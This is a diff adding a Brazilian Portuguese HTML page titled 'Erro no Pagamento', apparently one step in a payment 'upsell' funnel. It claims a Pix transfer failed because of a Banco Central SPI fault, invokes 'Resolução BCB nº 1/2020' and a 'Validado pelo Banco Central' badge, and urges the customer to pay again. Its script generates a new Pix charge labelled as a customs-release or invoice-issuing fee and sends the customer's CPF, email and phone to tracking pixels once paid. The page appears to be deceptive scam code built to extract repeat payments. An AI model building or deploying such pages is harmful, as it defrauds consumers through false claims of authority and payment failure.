@@ -1,0 +1,282 @@
+<!doctype html>
+<html lang="pt-BR">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" />
+    <title>Erro no Pagamento</title>
+    <link rel="icon" href="/favicon.png" type="image/png" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" />
+    <link rel="stylesheet" href="../../upsells-teste/shared/upsell.css" />
+    <style>
+      body { overflow: hidden; }
+    </style>
+  </head>
+  <body>
+    <div class="tt-shell">
+      <div class="tt-header" style="justify-content: center; position: relative;">
+        <h1 class="tt-header-title">Erro no Pagamento</h1>
+        <button class="tt-header-action" onclick="window.location.href='/'" style="position: absolute; right: 0;">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"><path d="M18 6l-12 12M6 6l12 12"></path></svg>
+        </button>
+      </div>
+
+      <div class="tt-card">
+        <div class="tt-screen">
+          <div class="tt-hero">
+            <div class="tt-hero-icon is-error">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><path d="m15 9-6 6"></path><path d="m9 9 6 6"></path></svg>
+            </div>
+            <span class="tt-badge">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z"></path><path d="M12 9v4"></path><path d="M12 17h.01"></path></svg>
+              Erro no Processamento
+            </span>
+            <h2 class="tt-hero-title">Falha Temporária</h2>
+            <p class="tt-hero-subtitle">A transação não foi processada no SPI (Banco Central)</p>
+            <p class="tt-hero-description">Isso é raro. Tente novamente - você está protegido contra duplicação.</p>
+          </div>
+
+          <div class="tt-alert-strip">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z"></path><path d="M12 9v4"></path><path d="M12 17h.01"></path></svg>
+            <div>
+              <strong>Situação do Seu Pedido</strong>
+              <p>O pagamento não foi confirmado. Seu pedido continua em processamento. Tente novamente para completar a transação.</p>
+            </div>
+          </div>
+
+          <div class="tt-block tt-gap">
+            <div class="tt-info-card is-neutral">
+              <div class="tt-info-card-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><path d="M12 16v-4"></path><path d="M12 8h.01"></path></svg>
+              </div>
+              <div class="tt-info-card-content">
+                <h3>O Que Pode Ter Ocorrido</h3>
+                <p>
+                  Houve uma falha transitória no SPI - Sistema de Pagamentos Instantâneos do Banco Central (ocorre em menos de 0,1% das transações). Se o débito saiu de sua conta, ele será revertido automaticamente em 24 horas.
+                </p>
+              </div>
+            </div>
+          </div>
+
+          <div class="tt-block">
+            <div class="tt-info-card is-teal">
+              <div class="tt-info-card-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"></path></svg>
+              </div>
+              <div class="tt-info-card-content">
+                <h3>✓ Segurança Garantida pelo Banco Central</h3>
+                <p>
+                  Tente novamente sem preocupações. A Resolução BCB nº 1/2020 garante anti-duplicidade: se a transação anterior foi processada, você receberá automático em até 24 horas. Nenhuma cobrança dupla.
+                </p>
+                <div class="tt-guarantee-list">
+                  <div class="tt-guarantee-item">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
+                    <span><strong>Prazo:</strong> Estorno em até 24 horas úteis</span>
+                  </div>
+                  <div class="tt-guarantee-item">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 13c0 5-3.5 7.5-7.5 8.5-.17.04-.33.04-.5 0C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.79 17 5 19 5a1 1 0 0 1 1 1z"></path></svg>
+                    <span><strong>Proteção:</strong> Anti-duplicidade Banco Central</span>
+                  </div>
+                  <div class="tt-guarantee-item">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect width="20" height="16" x="2" y="4" rx="2"></rect><path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7"></path></svg>
+                    <span><strong>Comprovante:</strong> Protocolo por e-mail</span>
+                  </div>
+                </div>
+                <p class="tt-fineprint">Resolução BCB nº 1 de 2020 - Banco Central do Brasil</p>
+              </div>
+            </div>
+          </div>
+
+          <div class="tt-block">
+            <p class="tt-cta-text">Tente pagar novamente com total segurança</p>
+            <div class="tt-trust-badge">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><path d="m9 12 2 2 4-4"></path></svg>
+              <span>Validado pelo Banco Central</span>
+            </div>
+          </div>
+
+          <div id="error-box" class="tt-form-error" style="display: none"></div>
+
+          <div class="tt-security-row">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 13c0 5-3.5 7.5-7.5 8.5-.17.04-.33.04-.5 0C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.79 17 5 19 5a1 1 0 0 1 1 1z"></path><path d="m9 12 2 2 4-4"></path></svg>
+            <span>100% Seguro • Criptografado</span>
+          </div>
+        </div>
+
+        <div class="tt-footer">
+          <button class="tt-btn-primary" id="btn-try-again">
+            <span class="tt-btn-primary-main">Tentar Novamente</span>
+            <span class="tt-btn-primary-sub">Protegido por Resolução BCB nº 1/2020</span>
+          </button>
+        </div>
+      </div>
+    </div>
+
+    <div class="tt-modal-overlay" id="pix-modal-overlay" style="display: none">
+      <div class="tt-modal">
+        <div class="tt-modal-icon">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect width="20" height="12" x="2" y="6" rx="2"></rect><circle cx="12" cy="12" r="2"></circle><path d="M6 12h.01M18 12h.01"></path></svg>
+        </div>
+        <h2 class="tt-modal-title">Pague com Pix</h2>
+        <p class="tt-modal-subtitle">Tente novamente para completar seu pagamento</p>
+        <div class="tt-qr-wrap">
+          <img id="pix-qr-img" src="" alt="QR Code Pix" />
+        </div>
+        <div class="tt-code-box">
+          <textarea id="pix-code-text" readonly rows="4"></textarea>
+          <button class="tt-btn-copy" id="btn-copy">Copiar Código</button>
+        </div>
+        <p class="tt-modal-hint">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
+          Processando seu pagamento...
+        </p>
+      </div>
+    </div>
+
+    <script src="/upsells/shared/pix-client.js"></script>
+    <script src="/upsells/shared/pixel-tracking.js"></script>
+    <script>
+      (function () {
+        "use strict";
+
+        var urlParams = new URLSearchParams(window.location.search);
+        var previousUpsell = urlParams.get("prev") || sessionStorage.getItem("upsell3_prev") || "upsell2";
+        var amount = parseFloat(urlParams.get("amount") || sessionStorage.getItem("upsell3_amount") || "10");
+        try {
+          sessionStorage.setItem("upsell3_prev", previousUpsell);
+          sessionStorage.setItem("upsell3_amount", String(amount));
+        } catch (e) {
+          /* noop */
+        }
+
+        var customerData = window.PixClient.getCustomerData();
+        var fired = false;
+        var pollInterval = null;
+        var pollTimeout = null;
+
+        PixelTracking.init();
+
+        function showError(msg) {
+          var box = document.getElementById("error-box");
+          box.textContent = msg;
+          box.style.display = msg ? "block" : "none";
+        }
+
+        function setLoading(loading) {
+          var btn = document.getElementById("btn-try-again");
+          var label = btn.querySelector(".tt-btn-primary-main");
+          btn.disabled = loading;
+          label.textContent = loading ? "Gerando..." : "Tentar Novamente";
+        }
+
+        function showPixModal(pixCode) {
+          document.getElementById("pix-code-text").value = pixCode;
+          document.getElementById("pix-qr-img").src =
+            "https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=" + encodeURIComponent(pixCode);
+          document.getElementById("pix-modal-overlay").style.display = "flex";
+        }
+
+        function hidePixModal() {
+          document.getElementById("pix-modal-overlay").style.display = "none";
+        }
+
+        function goNext() {
+          var target = previousUpsell === "upsell1" ? "/upsells/2/" : "/comprovante";
+          window.location.href = window.PixClient.urlWithUtm(target);
+        }
+
+        function startPolling(txId, gateway) {
+          console.log("[Upsell3] Iniciando polling - TxID:", txId, "Gateway:", gateway);
+          pollInterval = setInterval(async function () {
+            try {
+              console.log("[Upsell3] Verificando status do PIX...", txId);
+              var data = await window.PixClient.verificarStatusPix(txId, gateway);
+              console.log("[Upsell3] Status recebido:", data);
+              if (data.status === "approved" || data.status === "COMPLETED") {
+                console.log("[Upsell3] ✅ Pagamento aprovado!");
+                clearInterval(pollInterval);
+                clearTimeout(pollTimeout);
+                hidePixModal();
+
+                if (fired) {
+                  console.log("[Upsell3] ⚠️ Conversão já disparada");
+                  goNext();
+                  return;
+                }
+                fired = true;
+
+                PixelTracking.identifyUser({
+                  email: customerData.email,
+                  phone: customerData.telefone,
+                  cpf: customerData.cpf,
+                });
+                PixelTracking.trackEvent("PlaceAnOrder", {
+                  content_id: String(txId),
+                  content_type: "product",
+                  content_name:
+                    previousUpsell === "upsell1" ? "Taxa de Liberação Alfandegária" : "Taxa de Emissão da Nota Fiscal (TENF)",
+                  value: amount,
+                  currency: "BRL",
+                  quantity: 1,
+                  event_id: txId,
+                  order_id: txId,
+                });
+
+                goNext();
+              }
+            } catch (err) {
+              console.error("[Upsell3] ❌ Erro no polling:", err);
+            }
+          }, 3000);
+
+          pollTimeout = setTimeout(function () {
+            console.log("[Upsell3] Timeout de 30min - parando polling");
+            clearInterval(pollInterval);
+          }, 30 * 60 * 1000);
+        }
+
+        async function handleTryAgain() {
+          showError("");
+          setLoading(true);
+          try {
+            var pix = await window.PixClient.criarPix({
+              valor: amount,
+              nome: customerData.nome || "Cliente",
+              cpf: customerData.cpf || "",
+              email: customerData.email || "",
+              telefone: customerData.telefone || "",
+              itens: [{ nome: "Produto R$ " + amount.toFixed(2).replace(".", ","), preco: amount, quantidade: 1 }],
+            });
+
+            if (pix.success) {
+              var txId = pix.transactionId || pix.transaction_id;
+              showPixModal(pix.pixCode);
+              startPolling(txId, pix.gateway);
+            } else {
+              showError(pix.error || "Erro ao gerar PIX");
+            }
+          } catch (err) {
+            console.error("Erro ao gerar PIX:", err);
+            showError("Erro ao gerar PIX. Tente novamente.");
+          } finally {
+            setLoading(false);
+          }
+        }
+
+        document.getElementById("btn-try-again").addEventListener("click", handleTryAgain);
+
+        document.getElementById("btn-copy").addEventListener("click", async function () {
+          var btn = document.getElementById("btn-copy");
+          var ok = await window.PixClient.copyToClipboard(document.getElementById("pix-code-text").value);
+          if (ok) {
+            btn.textContent = "Copiado!";
+            setTimeout(function () {
+              btn.textContent = "Copiar Código";
+            }, 3000);
+          }
+        });
+      })();
+    </script>
+  </body>
+</html>
